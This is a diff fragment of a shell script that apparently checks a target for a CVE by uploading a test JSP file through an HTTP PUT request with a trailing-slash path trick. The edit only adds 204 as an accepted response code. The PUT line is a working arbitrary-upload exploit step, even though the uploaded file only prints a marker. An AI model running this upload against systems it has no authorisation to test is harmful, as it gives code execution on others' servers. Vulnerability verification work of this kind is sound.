@@ -12,7 +12,7 @@ log_info "Verifying $TARGET ($CVE) at $URL..."
 
 # Step 1: Upload test JSP
 HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${URL}/test.jsp/" -d '<% out.println("VULN");%>' 2>/dev/null)
-if [ "$HTTP_CODE" != "201" ] && [ "$HTTP_CODE" != "200" ]; then
+if [ "$HTTP_CODE" != "201" ] && [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "204" ]; then
     log_error "$TARGET PUT upload failed (HTTP $HTTP_CODE)"
     exit 1
 fi
